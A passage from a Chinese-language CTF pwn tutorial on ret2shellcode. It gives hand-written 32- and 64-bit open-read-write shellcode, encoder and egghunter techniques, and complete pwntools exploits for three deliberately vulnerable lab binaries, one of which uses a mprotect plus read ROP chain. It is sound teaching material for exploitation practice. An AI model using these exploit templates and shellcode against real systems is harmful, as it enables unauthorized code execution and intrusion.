stub 的最简实现就是复用 3.6 的链：把 mprotect 去掉，只保留 `read@plt`（或 read 的 syscall）+ 返回地址，本质是"用 ROP 做一次搬运"。

**方案 B：read 两次写入**

与方案 A 同源：第一次 payload 溢出 ret → `read@plt(0, 可写区, n)`，返回地址填可写区；第二次 send 完整 shellcode。32 位模板去掉 mprotect 段即可，64 位同型。这是空间受限题的最高频套路。

**方案 C：短跳（jmp short）串联**

```text
栈上布局（两段 shellcode 分散在相距不远的两处）:
[ 第一段 shellcode ......... eb 0c ] [ gap 0x0c 字节 ] [ 第二段 shellcode ]
                             ↑ jmp short：跳过 gap 进入第二段
```

`jmp short` 编码 `eb xx`，相对偏移范围 -128 ~ +127：目标地址 = 该指令的下一条指令地址 + xx。两段 shellcode 距离稍远时也可组合 `jmp short` + 一小段中转。

**方案 D：换更短的 shellcode**

- 用 3.2 手写版（23/25 字节）替代 pwntools 默认生成（约 40 字节）；
- 只保留必要步骤（如确定不缺 envp 时省掉 `xor edx, edx`）；
- 目标区离得远时优先考虑"搬运"，而不是硬塞。

---

## 3.9 32 位与 64 位 shellcode 差异汇总；orw shellcode 初步

### 3.9.1 差异速查表

| 项目 | 32 位 | 64 位 |
| --- | --- | --- |
| 系统调用指令 | int 0x80（cd 80） | syscall（0f 05） |
| 调用号寄存器 / execve 号 | eax / 11 | rax / 59 |
| 参数寄存器 | ebx, ecx, edx | rdi, rsi, rdx |
| 被破坏的寄存器 | 仅 eax | rcx、r11（syscall 自身） |
| 返回地址宽度 | 4 字节（p32） | 8 字节（p64），偏移记得 +8 saved rbp |
| mov 大立即数 | 最长 imm32，坏字节好躲 | imm64 尾部常带 \x00 → 用 push/pop 替代 |
| 字符串凑整技巧 | "/bin//sh" 凑 4 字节对齐 | "/bin///sh" 凑 8 字节；push rsp; pop rdi 省 1 字节 |
| 置零技巧 | xor eax,eax / cdq | xor esi,esi；rdx 用 xor 或 cdq（先保证 eax 正确） |
| 栈 16 字节对齐 | 一般无需关心 | shellcode 本身无关；调 libc 函数时需注意（movaps 崩溃） |

### 3.9.2 取 flag 的 orw shellcode 初步

很多场景（尤其沙箱禁了 execve）拿不到 shell，目标直接换成读文件：**open → read → write**。这里是入门版，进阶与 seccomp 对抗详见 [11 章](11-ORW与沙箱绕过.md)。

64 位无坏字节版（逐行注释）：

```asm
; ---- open("/flag", O_RDONLY) ----
mov eax, 0x67616c66      ; "flag" 的 4 字节装入 eax（b8 66 6c 61 67，无坏字节）
shl rax, 8               ; 左移 8 位，腾出最低字节
mov al, 0x2f             ; 填入 '/' → rax = 0x67616c662f
push rax                 ; 入栈 → 栈上形成 "/flag\0\0\0"
mov rdi, rsp             ; rdi = path
xor esi, esi             ; esi = O_RDONLY
xor eax, eax
mov al, 2                ; SYS_open = 2（64 位）
syscall                  ; 返回值 rax = fd
; ---- read(fd, buf, 0x60) ----
mov edi, eax             ; rdi = fd
mov rsi, rsp             ; buf 就用栈顶（原字符串位置，覆盖掉无妨）
xor edx, edx
mov dl, 0x60             ; count = 0x60
xor eax, eax             ; SYS_read = 0
syscall                  ; rsi/rdx 被内核保留，write 可直接复用
; ---- write(1, buf, 0x60) ----
push 1                   ; bf 01 00 00 00（mov edi,1）含 \x00 → 改用 push/pop
pop rdi                  ; rdi = 1（stdout）
xor eax, eax
mov al, 1                ; SYS_write = 1
syscall                  ; flag 内容打印到屏幕
```

注意两点：`syscall` 只破坏 rcx/r11，所以 read 的 buf/len 参数能被 write 直接复用；`mov edi, 1` 编码含 `\x00`，用 `push 1; pop rdi` 替代。

32 位版（int 0x80，用 "////flag" 凑双字压栈）：

```asm
xor ecx, ecx
push ecx                 ; '\0'
push 0x67616c66          ; "flag"
push 0x2f2f2f2f          ; "////" → 栈上连成 "////flag\0"
mov ebx, esp             ; ebx = path
mov al, 5                ; SYS_open = 5（32 位）
int 0x80
mov ebx, eax             ; ebx = fd
sub esp, 0x60            ; 栈上开缓冲区
mov ecx, esp             ; ecx = buf
mov dl, 0x60             ; edx = count
mov al, 3                ; SYS_read = 3
int 0x80
mov bl, 1                ; fd = 1（只改低 8 位）
mov dl, 0x60
mov al, 4                ; SYS_write = 4
int 0x80                 ; ecx 仍是 buf，直接复用
```

pwntools 快捷生成：

```python
asm(shellcraft.amd64.linux.cat('/flag'))
asm(shellcraft.i386.linux.cat('/flag'))
```

---

## 3.10 变体与扩展

### 3.10.1 ascii / alphanumeric shellcode

- **是什么**：全部字节落在可打印 ASCII（极端要求：仅 `[0-9A-Za-z]`）内的 shellcode，专治 scanf("%s")、白名单过滤、字母数字限制的输入口。
- **生成**：pwntools `pwnlib.encoders.i386.alpha_encoder.encode(sc, avoid=...)`、msfvenom `-e x86/alpha_mixed`（见 3.7.3）。
- **原理一句话**：`P`（0x50）恰是 `push eax`、`X`（0x58）恰是 `pop eax`、`h`（0x68）恰是 `push imm32`、`&`（0x26）恰是 `and eax, imm8`…… 这些字符"既是字母又是合法指令"，于是可以纯用字母数字拼出一个解码器，运行时在栈上还原真正的 shellcode 再跳入。64 位纯 alphanumeric 更难，实践中常允许少量额外字节。

### 3.10.2 egghunter 思想简介

- **场景**：注入点空间极小（只能放几十字节），但进程内存里某个大缓冲区（堆、另一段输入）已经躺着一小段 shellcode。
- **做法**：往注入点放一小段"猎手"代码——从低地址向高地址逐字节搜索内存，找到标记串（egg，习惯用 8 字节如 `w00tw00t.`，重复两次防误命中）就跳过去执行；真正的 shellcode 前面埋好同样的标记。
- **关键细节**：逐页扫描会踩到未映射页导致 SIGSEGV，经典 32 位实现用一次 int 0x80（如 access/验证调用）探测页可读性，失败就跳过整页（0x1000）。
- 示意伪码：

```text
egg = "w00tw00t."
ptr = 最低地址
loop:
    if ptr 所在页不可读: ptr = (页起点 + 0x1000); continue
    if 内存 [ptr, ptr+8) == egg: jmp ptr+8        # 跳到标记后的 shellcode
    ptr += 1
```

### 3.10.3 无 NX 但栈随机化时的对策

1. 优先找泄漏：程序打印、格式化字符串漏洞（见 08 章）、未初始化读取；
2. 地址无关定位：jmp esp / call esp（3.4）；
3. nop sled + 循环重连爆破：`while True: try: ... except: reconnect`， sled 越长命中越快；
4. 32 位且 ASLR 已关：gdb 一次定位即固定；远程与本地栈布局差异用"先发送、后修正"的调试法校准。

### 3.10.4 把 shellcode 放环境变量

无 NX + 本地题没有栈泄漏时的经典老技巧：环境变量数组位于栈底附近，ASLR 关闭时位置稳定。

```bash
export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*1000 + open("sc.bin","rb").read())')
```

32 位经典估算公式（程序名与整串环境变量已知时）：

```text
&env ≈ 0xbfffffff - 4 - len("程序路径字符串") - len("EGG=...整串环境串")
```

更稳的做法是用辅助程序直接算（经典 getenvaddr）：

```c
/* getenvaddr.c: gcc -m32 getenvaddr.c -o getenvaddr */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[]) {
    char *p = getenv(argv[1]);
    /* 从辅助程序自身换算到目标程序的栈基差异：两程序名长度不同导致 envp 位置差 */
    p += (strlen(argv[0]) - strlen(argv[2])) * 2;
    printf("%p\n", p);
    return 0;
}
```

用法：`./getenvaddr EGG ./vuln` 得到地址，exp 里 ret 填 `地址 + 若干`（落在 nop sled 内即可）。注意：export 无法塞 `\x00`，环境变量里的 shellcode 先做 alpha 编码或选无 00 版本；现代系统下环境变量区域随 ASLR 变动，务必关 ASLR 并实测。
---

## 3.11 典型例题

### 例题 1：经典"strcpy 复制到 bss + NX off"（32 位）

**关键伪 C 代码**

```c
/* r2s.c
 * 编译：gcc -m32 -no-pie -fno-stack-protector -z execstack r2s.c -o r2s
 */
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char buf2[200];                       /* 全局缓冲区 → bss */

int main() {
    char s[100];
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("welcome!");
    read(0, s, 0x100);                /* 溢出点：100 字节 buf 读入 256 字节 */
    strcpy(buf2, s);                  /* 关键：把输入复制进 bss */
    puts(buf2);
    return 0;
}
```

**checksec**

```text
[*] '/home/ctf/r2s'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled            ← 栈/bss 均可执行（READ_IMPLIES_EXEC）
    PIE:      No PIE (0x8048000)     ← buf2 地址固定
```

**解题思路**

1. NX off + no-PIE：把 shellcode 放在 s 开头，strcpy 会把它原样带进固定地址的 buf2；
2. `elf.symbols['buf2']` 拿 bss 地址（gdb `p &buf2` 亦可验证）；
3. 偏移用 cyclic 定：发 `cyclic(0x100)`，崩溃时 `eip` 对应 `cyclic_find(值)`，本题假设为 112（0x70）；
4. strcpy 按 `\x00` 截断 → shellcode 与填充中不能有 `\x00`；read 不怕 `\x0a`，但保持干净无妨。

**完整 exp**

```python
from pwn import *
context(arch='i386', log_level='info')

p = process('./r2s')
# p = remote('node.example.com', 10003)
elf = ELF('./r2s')

bss_addr = elf.symbols['buf2']        # 例如 0x0804C060，no-PIE 下固定
offset   = 112                        # cyclic 实测

shellcode = asm(shellcraft.i386.linux.sh())
payload = shellcode.ljust(offset, b'a') + p32(bss_addr)

p.sendlineafter(b'welcome!\n', payload)
p.interactive()                       # 成功拿到 shell：$ cat flag
```

**变体**：复制函数换成 `strncpy(buf2, s, n)` → shellcode 长度必须小于 n；换成 `memcpy` → `\x00` 可存活，直接用短版 shellcode；buf2 地址 PIE 开启且未打印 → 先泄漏（08 章）或换思路。

---

### 例题 2：栈可执行且打印栈地址（64 位）

**关键伪 C 代码**

```c
/* stack_exec.c
 * 编译：gcc stack_exec.c -o stack_exec -fno-stack-protector -z execstack
 */
#include <stdio.h>
#include <unistd.h>

int main() {
    char buf[0x50];
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("buf = %p\n", buf);        /* 泄漏栈地址 */
    read(0, buf, 0x200);              /* 溢出点 */
    return 0;
}
```

**checksec**

```text
[*] '/home/ctf/stack_exec'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled            ← 栈可执行
    PIE:      No PIE (0x400000)
```

**解题思路**

最直白的 ret2shellcode：解析泄漏的 buf 地址 → shellcode 写在 buf 开头 → ret 覆盖为 buf 地址。偏移 = 0x50（buf）+ 8（saved rbp）= 88。

**完整 exp**

```python
from pwn import *
context(arch='amd64', log_level='info')

p = process('./stack_exec')
# p = remote('node.example.com', 10004)

p.recvuntil(b'buf = ')
buf_addr = int(p.recvline().strip(), 16)     # 解析泄漏的栈地址

offset = 0x50 + 8
shellcode = asm(shellcraft.amd64.linux.sh())
payload = shellcode.ljust(offset, b'a') + p64(buf_addr)

p.send(payload)                              # read 输入用 send，别带多余 \n
p.interactive()
```

**变体**

- 不打印地址 → nop sled + 重连爆破（3.10.3），或 jmp esp/rsp（3.4）；
- 打印的是别的栈变量 → 按 `调试求出的差值` 换算到 buf；
- read 换成 `fgets(buf, 0x30, stdin)` → shellcode 必须无 `\x0a` 且总长受限（配合 3.7/3.8）。

---

### 例题 3：mprotect + read + shellcode 三段链（64 位）

**关键伪 C 代码**

```c
/* mpro.c
 * 编译：gcc mpro.c -o mpro -no-pie -fno-stack-protector   （NX 默认开启）
 */
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>

void *keep = mprotect;                /* 题目留的引用，保证 mprotect@plt 存在 */

int main() {
    char buf[0x50];
    setvbuf(stdout, NULL, _IONBF, 0);
    read(0, buf, 0x300);              /* 溢出点：0x50 + 8 之后即返回地址 */
    return 0;
}
```

**checksec**

```text
[*] '/home/ctf/mpro'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled             ← 栈/bss 不可执行，必须 mprotect 开权限
    PIE:      No PIE (0x400000)
```

**解题思路**

1. 无后门、不给 libc → ret2text/ret2libc 都不顺；但 `mprotect` 与 `read` 都有 plt；
2. 找 gadget：`ROPgadget --binary mpro | grep -E ": pop (rdi|rsi|rdx)"`；
3. 构造三段链：`mprotect(bss页, 0x1000, 7)` → `read(0, bss+0x100, 0x200)` → ret 到 bss+0x100；
4. 第二次 send 发送 shellcode。

gadget 示例输出（**地址以自己环境的 ROPgadget 实测为准**）：

```text
0x00000000004012b3 : pop rdi ; ret
0x00000000004012b1 : pop rsi ; ret        ← 若只有 pop rsi ; pop r15 ; ret，多垫 8 字节即可
0x00000000004012af : pop rdx ; ret        ← 找不到时用 pop rdx ; pop rbx ; ret 或 ret2csu（07 章）
```

**完整 exp**

```python
from pwn import *
context(arch='amd64', log_level='info')

p = process('./mpro')
# p = remote('node.example.com', 10005)
elf = ELF('./mpro')

pop_rdi = 0x4012b3                     # ← 实测替换
pop_rsi = 0x4012b1
pop_rdx = 0x4012af

page   = elf.bss() & ~0xfff            # bss 所在页起点（页对齐！）
offset = 0x50 + 8

payload  = b'a' * offset
# ① mprotect(page, 0x1000, RWX)
payload += p64(pop_rdi) + p64(page)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx) + p64(7)
payload += p64(elf.plt['mprotect'])
# ② read(0, page+0x100, 0x200)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(page + 0x100)
payload += p64(pop_rdx) + p64(0x200)
payload += p64(elf.plt['read'])
# ③ read 返回后跳入刚读入的 shellcode
payload += p64(page + 0x100)

p.send(payload)
sleep(0.5)                             # 等程序执行到第二次 read
p.send(asm(shellcraft.amd64.linux.sh()))
p.interactive()
```

**变体**

- 缺 `pop rdx` → ret2csu（07 章）或带额外弹出的复合 gadget 垂数；
- 没有 mprotect@plt → `pop rax + syscall` 纯 ROT 拼 mprotect 系统调用（04 章）；
- 32 位同型链见 3.6.3；
- 目标页换栈页：需先泄漏栈地址（environ / 05、08 章手段），其余步骤一致。

---

## 3.12 常见坑

| 现象 | 原因与排查 |
| --- | --- |
| shellcode 明明发上去了却没执行 | shellcode 含 `\x0a` 被 fgets/gets 当行结束截断；含 `\x00` 被 strcpy 截断。生成后先 `assert b'\x0a' not in sc` 之类自查 |
| 64 位总差 8 字节跳歪 | 忘了 saved rbp 占 8 字节；或把 ret 填成 shellcode 中间某条指令的地址。用 cyclic + 崩溃现场复核 |
| execve 返回错误码（rax 为负） | 参数没置零：32 位 ecx/edx、64 位 rsi/rdx 残留脏数据 → 内核按野指针解析 EFAULT。所有参数寄存器先 xor 清零 |
| 本地能通、远程必挂 / 时好时坏 | 栈位置随机导致地址猜错。用泄漏、jmp esp、nop sled + 重连爆破；远程环境栈布局与本地不同，地址需重测 |
| 64 位 payload 一发就断连 | `mov r64, imm64`（48 b8 ...）尾字节 `\x00` 触发截断 → 改 push/pop 写法；含 `\x00` 的 p64 地址走 strcpy 通道同样断 |
| int 0x80 没反应 | 忘了 `mov al, 11`；或 eax 高 24 位是脏数据（`mov al` 只改低 8 位，前提高 24 位为 0） |
| mprotect 返回负数 | addr 未页对齐（要 `& ~0xfff`），或对未映射地址操作（-ENOMEM），或 prot 传错（RWX=7） |
| ret 后第一条指令就 SIGSEGV | 目标段实际不可执行：vmmap / `/proc/pid/maps` 复核；NX off 也可能 gdb 内外表现不同，以运行态为准 |
| pwntools 汇编出的码体系不对 | 忘设 `context.arch`，`asm(shellcraft.sh())` 按默认 i386 出码塞进了 64 位程序 |
| shellcode 在 gdb 里正常、直接跑就崩 | gdb 环境变量改变栈布局，地址/偏移不同；用固定 env 重测，或改用泄漏 |

---

## 3.13 本章检查清单

做题时按顺序自检：

- [ ] checksec / vmmap：NX 状态？哪段可写？哪段可执行？
- [ ] 选定 shellcode 落点：栈（3.3）/ jmp esp（3.4）/ bss（3.5）/ mprotect 后的页（3.6）？
- [ ] `context.arch` 与程序位数一致；shellcode 长度 ≤ 可写空间？
- [ ] 坏字节审计：payload 中有无 `\x00` `\x0a` `\x0d` `\x20` `\xff` 与输入/复制函数冲突？
- [ ] 偏移用 cyclic/pattern 实测；64 位记得 +8（saved rbp）？
- [ ] 跳转地址：mprotect 场景页对齐（`& ~0xfff`）？bss 地址固定（no-PIE）？
- [ ] execve 的参数寄存器全部置零（32 位 ecx/edx；64 位 rsi/rdx）？
- [ ] 多段输入时序：第二次 send 前程序已到达第二次 read（sleep 或等回显）？
- [ ] 本地 getshell 后再打远程，远程地址与偏移重新校对？

---

## 相关阅读

- [01 基础知识与工具链](01-基础知识与工具链.md) —— pwntools、checksec、gdb、cyclic 的系统用法
- [04 ret2syscall](04-ret2syscall.md) —— 没有 mprotect@plt 时用 gadget 直接拼 syscall；ROP 传参的完整基础
- [11 ORW与沙箱绕过](11-ORW与沙箱绕过.md) —— execve 被禁时的 orw 全解与 seccomp 沙箱对抗
- 上一章：[02 ret2text](02-ret2text.md)　下一章：[04 ret2syscall](04-ret2syscall.md)

---

> 本章一句话总结：ret2shellcode = "自己带枪 + 找一块能开枪的场地"。NX 与 vmmap 决定场地在哪（栈 / bss / mprotect 出来的 RWX 页），坏字节决定弹药能不能装进弹匣（3.7），空间决定要不要分两段运枪（3.8）；而手写 shellcode 的功底（3.2）决定了前三者全都受限时你还有没有最后一种可能。
